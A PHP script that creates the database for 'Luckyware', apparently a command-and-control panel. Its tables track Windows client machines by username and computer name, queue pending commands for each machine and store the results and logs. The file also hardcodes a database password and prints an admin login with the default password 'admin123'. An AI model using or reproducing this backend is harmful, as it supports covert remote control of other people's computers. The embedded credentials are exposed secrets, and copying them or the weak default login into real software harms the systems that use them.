<?php
// Database Setup Script - Run this ONCE after deploying to Render
// Visit: https://your-app.onrender.com/setup_database.php

header('Content-Type: text/plain');

$db_host = 'dpg-db0k1ifavr4c7382re2g-a';
$db_name = 'luckyware';
$db_user = 'luckyware_user';
$db_pass = 'SR5BqBJhHKOlYEjvn5ia71HFWRJtTIZ4';
$db_port = 5432;

echo "Luckyware Database Setup\n";
echo "========================\n\n";

try {
    $dsn = "pgsql:host=$db_host;port=$db_port;dbname=$db_name";
    $pdo = new PDO($dsn, $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    echo "✅ Connected to database!\n\n";
    
    // Create clients table
    echo "Creating 'clients' table...\n";
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS clients (
            id SERIAL PRIMARY KEY,
            client_id VARCHAR(255) UNIQUE NOT NULL,
            username VARCHAR(255),
            computer_name VARCHAR(255),
            windows_version VARCHAR(255),
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status VARCHAR(50) DEFAULT 'online'
        )
    ");
    echo "✅ 'clients' table created\n\n";
    
    // Create commands table
    echo "Creating 'commands' table...\n";
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS commands (
            id SERIAL PRIMARY KEY,
            client_id VARCHAR(255) NOT NULL,
            command_type VARCHAR(100) NOT NULL,
            command_data TEXT,
            status VARCHAR(50) DEFAULT 'pending',
            result TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP,
            completed_at TIMESTAMP
        )
    ");
    echo "✅ 'commands' table created\n\n";
    
    // Create logs table
    echo "Creating 'logs' table...\n";
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            client_id VARCHAR(255) NOT NULL,
            log_type VARCHAR(50) DEFAULT 'info',
            message TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ");
    echo "✅ 'logs' table created\n\n";
    
    // Create indexes
    echo "Creating indexes...\n";
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients(client_id)");
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands(client_id)");
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)");
    $pdo->exec("CREATE INDEX IF NOT EXISTS idx_logs_client_id ON logs(client_id)");
    echo "✅ Indexes created\n\n";
    
    // Verify tables
    echo "Verifying tables...\n";
    $result = $pdo->query("SELECT tablename FROM pg_tables WHERE schemaname = 'public' ORDER BY tablename");
    $tables = $result->fetchAll(PDO::FETCH_COLUMN);
    
    foreach($tables as $table) {
        echo "  - $table\n";
    }
    
    echo "\n========================\n";
    echo "✅ DATABASE SETUP COMPLETE!\n";
    echo "========================\n\n";
    echo "You can now:\n";
    echo "1. Login at: https://ysafsdfsdfdsafgge453545-67456345.onrender.com/\n";
    echo "2. Username: admin\n";
    echo "3. Password: admin123\n\n";
    echo "⚠️  DELETE THIS FILE after setup for security!\n";
    
} catch(PDOException $e) {
    echo "❌ ERROR: " . $e->getMessage() . "\n";
    die();
}
?>
